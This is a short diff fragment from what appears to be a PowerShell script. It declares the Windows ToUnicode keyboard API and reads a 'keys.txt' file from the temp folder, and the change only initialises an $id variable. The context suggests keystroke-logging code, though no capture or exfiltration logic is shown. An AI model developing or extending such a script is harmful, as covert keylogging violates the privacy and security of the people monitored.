@@ -102,6 +102,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 }
 
 $idFilePath = "$env:temp\keys.txt"
+$id=""
 
 if (Test-Path -Path $idFilePath) {
   $id = Get-Content $idFilePath
